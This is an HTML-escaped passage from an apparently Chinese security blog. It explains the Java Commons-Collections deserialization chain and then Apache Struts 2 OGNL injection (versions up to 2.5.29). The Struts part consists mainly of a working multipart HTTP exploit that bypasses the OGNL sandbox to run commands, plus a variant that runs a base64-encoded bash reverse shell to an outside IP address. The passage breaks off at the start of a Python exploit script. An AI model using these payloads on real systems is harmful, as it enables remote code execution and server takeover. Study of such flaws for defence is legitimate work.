&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;abstract&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;AbstractInputCheckedMapDecorator&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;AbstractMapDecorator&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;AbstractInputCheckedMapDecorator&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;MapEntry&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;AbstractMapEntryDecorator&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; AbstractInputCheckedMapDecorator parent;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;MapEntry&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(Entry entry, AbstractInputCheckedMapDecorator parent)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;super&lt;/span&gt;(entry);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.parent = parent;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; Object &lt;span class=&#34;title function_&#34;&gt;setValue&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(Object value)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            value = &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.parent.checkSetValue(value);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;super&lt;/span&gt;.entry.setValue(value);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;map 中的元素在增加删除修改的时候会调用 setValue 方法&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6.AnnotationInvocationHandler&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;重写了 readobject，调用了 setValue 方法进行了键值修改&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;readObject&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(java.io.ObjectInputStream s)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; java.io.IOException, ClassNotFoundException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ObjectInputStream.&lt;span class=&#34;type&#34;&gt;GetField&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;fields&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; s.readFields();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;java&lt;/span&gt;.io.InvalidObjectException(&lt;span class=&#34;string&#34;&gt;&amp;quot;Non-annotation type in annotation serial stream&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Map&amp;lt;String, Class&amp;lt;?&amp;gt;&amp;gt; memberTypes = annotationType.memberTypes();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// consistent with runtime Map type&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Map&amp;lt;String, Object&amp;gt; mv = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;LinkedHashMap&lt;/span&gt;&amp;lt;&amp;gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// If there are annotation members without values, that&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// situation is handled by the invoke method.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (Map.Entry&amp;lt;String, Object&amp;gt; memberValue : streamVals.entrySet()) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; memberValue.getKey();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Class&amp;lt;?&amp;gt; memberType = memberTypes.get(name);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (memberType != &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;) &amp;#123;  &lt;span class=&#34;comment&#34;&gt;// i.e. member still exists&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            value = memberValue.getValue();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!(memberType.isInstance(value) ||&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                  value &lt;span class=&#34;keyword&#34;&gt;instanceof&lt;/span&gt; ExceptionProxy)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                  memberValue.setValue(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                	&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;AnnotationTypeMismatchExceptionProxy&lt;/span&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        value.getClass() + &lt;span class=&#34;string&#34;&gt;&amp;quot;[&amp;quot;&lt;/span&gt; + value + &lt;span class=&#34;string&#34;&gt;&amp;quot;]&amp;quot;&lt;/span&gt;).setMember(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            annotationType.members().get(name)));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;此时如果某台服务器上，开了一个服务，接受 java 序列化字节码，并且使用 ObjectInputStream.readObject 方法进行反序列化，那么我们构造的恶意代码就可以执行&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTEvYXJ0aWNsZS9kZXRhaWxzLzEwNjE2MDE4Mg==&#34;&gt;(70 条消息) 漫谈 Commons-Collections 反序列化_夏日清 1 的博客 - CSDN 博客&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYml0dGVyei9wLzE1MDM1NTgxLmh0bWw=&#34;&gt;commons-collections 利用链学习总结 - bitterz - 博客园 (cnblogs.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;讲都讲了，struts 一起讲了吧，凑个 java 大圆满～&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;struts-2反序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#struts-2反序列化&#34;&gt;#&lt;/a&gt; struts 2 反序列化&lt;/h3&gt;
&lt;p&gt;SSH/SSM&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126171544473.png&#34; alt=&#34;image-20221126171544473&#34;&gt;&lt;/p&gt;
&lt;p&gt;Spring 管理 bean&lt;/p&gt;
&lt;p&gt;Struts 提供地址映射&lt;/p&gt;
&lt;p&gt;hibernate 持久层   /  mybatis&lt;/p&gt;
&lt;p&gt;配置 tomcat&lt;/p&gt;
&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126173010089.png&#34; alt=&#34;image-20221126173010089&#34; style=&#34;zoom: 80%;&#34; /&gt;
&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126173031317.png&#34; alt=&#34;image-20221126173031317&#34; style=&#34;zoom:80%;&#34; /&gt;
&lt;p&gt;漏洞影响版本&lt;/p&gt;
&lt;p&gt;2.0.0 &amp;lt;= Apache Struts &amp;lt;= 2.5.29&lt;/p&gt;
&lt;p&gt;使用 %{} 解析 OGNL 表达式&lt;/p&gt;
&lt;p 6*6=&#34;&#34;&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMTQyLjEyODoxODA4MC9pbmRleC5hY3Rpb24/aWQ9JTI1&#34;&gt;http://192.168.142.128:18080/index.action?id=%&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;会执行 {} 内的内容，在网页源码中显示 36&lt;/p&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;p&gt;执行 id&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /index.action HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.142.128:18080&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DNT: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Cookie: JSESSIONID=node01c863u8lzu8eyn099a51bjyie0.node0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 1191&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;------WebKitFormBoundaryl7d1B1aGsV2wcZwF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Disposition: form-data; name=&amp;quot;id&amp;quot; %&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(#request.map=#@org.apache.commons.collections.BeanMap@&amp;#123;&amp;#125;).toString().substring(0,0) +&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(#request.map.setBean(#request.get(&amp;#x27;struts.valueStack&amp;#x27;)) == true).toString().substring(0,0) +&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(#request.map2=#@org.apache.commons.collections.BeanMap@&amp;#123;&amp;#125;).toString().substring(0,0) +&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(#request.map2.setBean(#request.get(&amp;#x27;map&amp;#x27;).get(&amp;#x27;context&amp;#x27;)) == true).toString().substring(0,0) +&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(#request.map3=#@org.apache.commons.collections.BeanMap@&amp;#123;&amp;#125;).toString().substring(0,0) +&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(#request.map3.setBean(#request.get(&amp;#x27;map2&amp;#x27;).get(&amp;#x27;memberAccess&amp;#x27;)) == true).toString().substring(0,0) +&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(#request.get(&amp;#x27;map3&amp;#x27;).put(&amp;#x27;excludedPackageNames&amp;#x27;,#@org.apache.commons.collections.BeanMap@&amp;#123;&amp;#125;.keySet()) ==&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;true).toString().substring(0,0) +&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(#request.get(&amp;#x27;map3&amp;#x27;).put(&amp;#x27;excludedClasses&amp;#x27;,#@org.apache.commons.collections.BeanMap@&amp;#123;&amp;#125;.keySet()) ==&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;true).toString().substring(0,0) +&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(#application.get(&amp;#x27;org.apache.tomcat.InstanceManager&amp;#x27;).newInstance(&amp;#x27;freemarker.template.utility.Execute&amp;#x27;).exec(&amp;#123;&amp;#x27;id&amp;#x27;&amp;#125;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;------WebKitFormBoundaryl7d1B1aGsV2wcZwF—&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  This is my JSP page. &amp;lt;br&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;s:a id=&amp;quot;%&amp;#123;id&amp;#125;&amp;quot; href=&amp;quot;onlytest&amp;quot;&amp;gt;J2EE web development tutorials&amp;lt;/s:a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//回显位置再id中&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;或者建立反弹连接，只需要修改最后一行&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(#application.get(&amp;#x27;org.apache.tomcat.InstanceManager&amp;#x27;).newInstance(&amp;#x27;freemarker.template.utility.Execute&amp;#x27;).exec(&amp;#123;&amp;#x27;bash -c &amp;#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDYuOC4xNzUvNzc3NyAwPiYx&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;&amp;#x27;&amp;#125;))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;python 脚本&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from lxml import etree&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import argparse&lt;/span&gt;&lt;br&gt;&lt;span 